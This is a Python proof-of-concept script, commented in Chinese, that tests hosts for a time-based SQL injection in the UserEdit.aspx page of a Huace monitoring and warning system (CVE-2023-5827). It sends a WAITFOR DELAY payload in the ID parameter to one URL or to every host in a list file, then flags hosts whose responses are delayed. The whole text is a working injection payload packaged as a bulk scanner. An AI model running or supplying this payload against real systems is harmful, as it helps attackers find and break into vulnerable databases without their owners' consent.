import argparse
from os import EX_OSFILE
import requests
import time

# 从文件中读取所有Host
def read_hosts_from_file(file_path):
    with open(file_path, 'r') as file:
        hosts = [line.strip() for line in file.readlines()]
    return hosts

# 解析命令行参数
parser = argparse.ArgumentParser(description='华测监测预警系统接口UserEdit.aspxSQL注入验证POC')
parser.add_argument('-u', '--url', type=str, help='单一Host URL')
parser.add_argument('-l', '--list', type=str, help='包含多个Host的文件路径')

args = parser.parse_args()

# 获取Hosts
hosts = []
if args.url:
    hosts.append(args.url)
if args.list:
    hosts.extend(read_hosts_from_file(args.list))

if not hosts:
    print("-h --help")
    exit(1)

# 定义请求头
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close"
}

# 遍历每个Host并发送POST请求
for host in hosts:
    # 定义请求的URL
    url = f"http://{host}/Web/SysManage/UserEdit.aspx?&ID=1';WAITFOR+DELAY+'0:0:5'--"

    # 发送POST请求并测量响应时间
    start_time = time.time()
    try:
        response = requests.post(url, headers=headers)
        end_time = time.time()

        # 计算响应时长
        response_time = end_time - start_time

        # 判断响应时长是否超过6秒
        if response_time > 6:
            print(f"Host: {host} : 存在CVE-2023-5827")
        else:
            print(f"Host: {host} : 不存在CVE-2023-5827")
    except requests.exceptions.RequestException as e:
        print(f"Host: {host}")
        print(f"Request failed: {e}")
